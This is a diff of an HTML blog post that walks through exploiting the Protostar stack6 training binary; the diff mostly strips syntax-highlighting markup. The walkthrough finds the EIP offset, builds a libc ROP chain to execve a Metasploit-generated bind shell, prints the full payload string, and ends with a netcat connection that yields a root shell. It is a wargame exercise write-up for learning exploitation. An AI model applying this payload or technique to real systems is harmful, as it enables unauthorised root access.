@@ -89,19 +89,19 @@
 <p>Before we do anything else, let's start off by gaining control over EIP. We'll use Metasploit's <code>pattern_create</code> and <code>pattern_offset</code> tools to help us figure this one out.</p>
 <div class="highlight"><pre>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &gt; inputroot@kali:~# gdb -q ./stack6
 Reading symbols from /root/stack6...done.
-gdb<span class="nv">$ </span>r &lt; input
+gdb$ r &lt; input
 input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------------------<span class="o">[</span>regs<span class="o">]</span>
+--------------------------------------------------------------------------[regs]
   EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
   ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
-  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError <span class="k">while </span>running hook_stop:
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
 Cannot access memory at address 0x37634136
-0x37634136 in ?? <span class="o">()</span>
-gdb<span class="nv">$ </span>q
+0x37634136 in ?? ()
+gdb$ q
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
-<span class="o">[</span>*<span class="o">]</span> Exact match at offset 80
+[*] Exact match at offset 80
 </pre></div>
 
 
@@ -109,10 +109,10 @@ root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
 <h2>Plan</h2>
 <p>Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as <code>/tmp/pwn</code>:</p>
 <div class="highlight"><pre>root@kali:~# msfpayload linux/x86/shell_bind_tcp X &gt; linux-bind-shell-tcp
-Created by msfpayload <span class="o">(</span>http://www.metasploit.com<span class="o">)</span>.
+Created by msfpayload (http://www.metasploit.com).
 Payload: linux/x86/shell_bind_tcp
  Length: 78
-Options: <span class="o">{}</span>
+Options: {}
 </pre></div>
 
 
@@ -135,7 +135,7 @@ Options: <span class="o">{}</span>
 <h3>Getting our arguments into memory</h3>
 <p>First we need to get the arguments to the <code>execve</code> call into memory. The first argument will point to the string <code>"/bin/pwn"</code>. We can just use a <code>NULL</code> for the second and third parameters.</p>
 <p>We could just pass the parameters in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the <code>.data</code> section to store these parameters:</p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>objdump -D /opt/protostar/bin/stack6 | grep __data
+<div class="highlight"><pre>user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
 08049710 &lt;__data_start&gt;:
 </pre></div>
 
@@ -150,37 +150,37 @@ Options: <span class="o">{}</span>
 <li>Repeat steps 1 and 2 for successive 4 byte chunks, updating the address <code>[r2]</code> each time. We can also add a <code>NULL</code> on the end to terminate the string and provide the <code>NULL</code> for arguments two and three of the call to <code>execve</code>.</li>
 </ol>
 <p>Let's look for these gadgets. There's not alot to go on in the <code>stack6</code> binary itself, so we look in <code>libc</code> as this is also linked in. We'll start with the <code>mov</code>, so we an identify which register we need to pop into, then the two <code>pop</code> gadgets.</p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>./rp-lin-x86 -f /lib/libc-2.11.2.so --rop<span class="o">=</span>4 --unique | grep <span class="s2">&quot; mov dword \[ecx\]&quot;</span>
+<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot; mov dword \[ecx\]&quot;
 ...
-0x00074997: mov dword <span class="o">[</span>ecx<span class="o">]</span>, edx ; ret  ;  <span class="o">(</span>1 found<span class="o">)</span>
+0x00074997: mov dword [ecx], edx ; ret  ;  (1 found)
 ...
-user@protostar:~<span class="nv">$ </span>./rp-lin-x86 -f /lib/libc-2.11.2.so --rop<span class="o">=</span>4 --unique | grep <span class="s2">&quot;pop edx ; ret&quot;</span>
+user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot;pop edx ; ret&quot;
 ...
-0x00001a9e: pop edx ; ret  ;  <span class="o">(</span>6 found<span class="o">)</span>
+0x00001a9e: pop edx ; ret  ;  (6 found)
 ...
-user@protostar:~<span class="nv">$ </span>./rp-lin-x86 -f /lib/libc-2.11.2.so --rop<span class="o">=</span>4 --unique | grep <span class="s2">&quot;pop ecx ; ret&quot;</span>
+user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot;pop ecx ; ret&quot;
 ...
-0x0013519d: pop ecx ; ret  ;  <span class="o">(</span>1 found<span class="o">)</span>
+0x0013519d: pop ecx ; ret  ;  (1 found)
 ...
 </pre></div>
 
 
 <p>We can get the absolute address of this by adding it to the base address of <code>libc</code> which we can get from <code>/proc/&lt;pid&gt;/maps</code> as shown below.  </p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>gdb -q /opt/protostar/bin/stack6
+<div class="highlight"><pre>user@protostar:~$ gdb -q /opt/protostar/bin/stack6
 Reading symbols from /opt/protostar/bin/stack6...done.
-gdb<span class="nv">$ </span>b main
+gdb$ b main
 Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
-gdb<span class="nv">$ </span>r
-Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>0x1, <span class="nv">argv</span><span class="o">=</span>0xbffff874<span class="o">)</span> at stack6/stack6.c:27
+gdb$ r
+Breakpoint 1, main (argc=0x1, argv=0xbffff874) at stack6/stack6.c:27
 27  stack6/stack6.c: No such file or directory.
     in stack6/stack6.c
-gdb<span class="nv">$ </span>info proc
+gdb$ info proc
 process 2080
-<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/home/user&#39;</span>
-<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-gdb<span class="nv">$ </span>shell
-<span class="nv">$ </span>cat /proc/2080/maps
+cmdline = &#39;/opt/protostar/bin/stack6&#39;
+cwd = &#39;/home/user&#39;
+exe = &#39;/opt/protostar/bin/stack6&#39;
+gdb$ shell
+$ cat /proc/2080/maps
 08048000-08049000 r-xp 00000000 00:10 3537       /opt/protostar/bin/stack6
 08049000-0804a000 rwxp 00000000 00:10 3537       /opt/protostar/bin/stack6
 b7e96000-b7e97000 rwxp 00000000 00:00 0
@@ -190,11 +190,11 @@ b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
 b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
 b7fd9000-b7fdc000 rwxp 00000000 00:00 0
 b7fe0000-b7fe2000 rwxp 00000000 00:00 0
-b7fe2000-b7fe3000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso<span class="o">]</span>
+b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
 b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
 b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
 b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
-bffeb000-c0000000 rwxp 00000000 00:00 0          <span class="o">[</span>stack<span class="o">]</span>
+bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 </pre></div>
 
 
@@ -232,9 +232,9 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          <span class="o">[</span>stack<s
 
 <h3>Setting up the registers</h3>
 <p>Next step it to place the arguments in the three registers <code>ebx</code>, <code>ecx</code> and <code>edx</code>, so we need to find a <code>pop</code> for each.</p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep <span class="s2">&quot; pop ebx&quot;</span> --color
+<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &quot; pop ebx&quot; --color
 ...
-0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  <span class="o">(</span>1 found<span class="o">)</span>
+0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
 ...
 </pre></div>
 
@@ -254,61 +254,61 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          <span class="o">[</span>stack<s
 
 <h3>Calling <code>execve</code></h3>
 <p>We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, <code>libc</code> contains a gadget that serves both purposes:</p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>./rp-lin-x86 -f /lib/libc-2.11.2.so --rop<span class="o">=</span>4 --unique | grep <span class="s2">&quot;0x0000000B&quot;</span> ; int 0x80<span class="err">&quot;</span>
+<div class="highlight"><pre>user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &quot;0x0000000B&quot; ; int 0x80&quot;
 ...
-0x00097193: mov eax, 0x0000000B ; int 0x80 ;  <span class="o">(</span>1 found<span class="o">)</span>
+0x00097193: mov eax, 0x0000000B ; int 0x80 ;  (1 found)
 ...
 </pre></div>
 
 
 <p>Our finished stack layout should look like this:</p>
-<div class="highlight"><pre><span class="o">&lt;</span>lower memory<span class="o">&gt;</span>
-<span class="kc">...</span>
-<span class="c1"># Load the target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049710</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data
-<span class="c1"># Load the first part of our string &quot;/tmp&quot; into edx</span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="s">&quot;/tmp&quot;</span> <span class="o">&lt;-</span> First part of our string <span class="o">/</span>tmp
-<span class="c1"># Perform to move from edx to the .data segment</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="c1"># Load the next target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049714</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data <span class="o">+</span> <span class="m">4</span> bytes
-<span class="c1"># Load the second part of our string &quot;/pwn&quot; into edx </span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="s">&quot;/pwn&quot;</span> <span class="o">&lt;-</span> Second part of our string <span class="o">/</span>pwn
-<span class="c1"># Perform the move to .data</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="c1"># Load the final target address in .data</span>
-    <span class="mh">0xb7fcc19d</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop ecx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Target memory address <span class="kr">in</span> .data <span class="o">+</span> <span class="m">4</span> bytes
-<span class="c1"># Load the NULL into edx </span>
-    <span class="mh">0xb7e98a9e</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x00000000</span> <span class="o">&lt;-</span> <span class="kc">NULL</span> bytes
-<span class="c1"># Perform the move to .data</span>
-    <span class="mh">0xb7f0b997</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>mov dword <span class="p">[</span>ecx<span class="p">],</span> edx<span class="p">;</span> ret<span class="p">)</span>
-<span class="c1"># Load registers</span>
-    <span class="mh">0xb7f6fa81</span> <span class="o">&lt;-</span> Return address <span class="p">(</span>pop edx<span class="p">;</span> pop ecx<span class="p">;</span> pop ebx<span class="p">;</span> ret<span class="p">)</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Argument <span class="m">3</span> destined <span class="kr">for</span> edx <span class="o">-</span> address of <span class="kc">NULL</span>
-    <span class="mh">0x08049718</span> <span class="o">&lt;-</span> Argument <span class="m">2</span> destined <span class="kr">for</span> ecx <span class="o">-</span> address of <span class="kc">NULL</span>
-    <span class="mh">0x08049710</span> <span class="o">&lt;-</span> Argument <span class="m">1</span> destined <span class="kr">for</span> ebx <span class="o">-</span> address of <span class="s">&quot;/tmp/pwn&quot;</span>
-<span class="c1"># Call execve</span>
-    <span class="mh">0xb7f2e193</span> <span class="o">&lt;-</span> Return Address <span class="p">(</span>second ROP gadget<span class="p">)</span>
-<span class="kc">...</span>
-<span class="o">&lt;</span>higher memory<span class="o">&gt;</span>
+<div class="highlight"><pre>&lt;lower memory&gt;
+...
+# Load the target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049710 &lt;- Target memory address in .data
+# Load the first part of our string &quot;/tmp&quot; into edx
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    &quot;/tmp&quot; &lt;- First part of our string /tmp
+# Perform to move from edx to the .data segment
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+# Load the next target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049714 &lt;- Target memory address in .data + 4 bytes
+# Load the second part of our string &quot;/pwn&quot; into edx 
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    &quot;/pwn&quot; &lt;- Second part of our string /pwn
+# Perform the move to .data
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+# Load the final target address in .data
+    0xb7fcc19d &lt;- Return address (pop ecx; ret)
+    0x08049718 &lt;- Target memory address in .data + 4 bytes
+# Load the NULL into edx 
+    0xb7e98a9e &lt;- Return address (pop edx; ret)
+    0x00000000 &lt;- NULL bytes
+# Perform the move to .data
+    0xb7f0b997 &lt;- Return address (mov dword [ecx], edx; ret)
+# Load registers
+    0xb7f6fa81 &lt;- Return address (pop edx; pop ecx; pop ebx; ret)
+    0x08049718 &lt;- Argument 3 destined for edx - address of NULL
+    0x08049718 &lt;- Argument 2 destined for ecx - address of NULL
+    0x08049710 &lt;- Argument 1 destined for ebx - address of &quot;/tmp/pwn&quot;
+# Call execve
+    0xb7f2e193 &lt;- Return Address (second ROP gadget)
+...
+&lt;higher memory&gt;
 </pre></div>
 
 
 <p>This now gives us the following payload:</p>
-<div class="highlight"><pre>user@protostar:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*80 + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/tmp&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x14\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/pwn&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;\x00\x00\x00\x00&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x81\xfa\xf6\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x93\xe1\xf2\xb7&quot;&#39;</span> &gt; input
-user@protostar:~<span class="nv">$ </span>cat input | /opt/protostar/bin/stack6
+<div class="highlight"><pre>user@protostar:~$ python -c &#39;print &quot;A&quot;*80 + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/tmp&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x14\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;/pwn&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x9d\xc1\xfc\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x9e\x8a\xe9\xb7&quot; + &quot;\x00\x00\x00\x00&quot; + &quot;\x97\xb9\xf0\xb7&quot; + &quot;\x81\xfa\xf6\xb7&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x18\x97\x04\x08&quot; + &quot;\x10\x97\x04\x08&quot; + &quot;\x93\xe1\xf2\xb7&quot;&#39; &gt; input
+user@protostar:~$ cat input | /opt/protostar/bin/stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������
 </pre></div>
 
 
 <p>And from another shell:</p>
-<div class="highlight"><pre><span class="nv">$ </span>nc 192.168.94.133 4444
+<div class="highlight"><pre>$ nc 192.168.94.133 4444
 whoami
 root
 </pre></div>
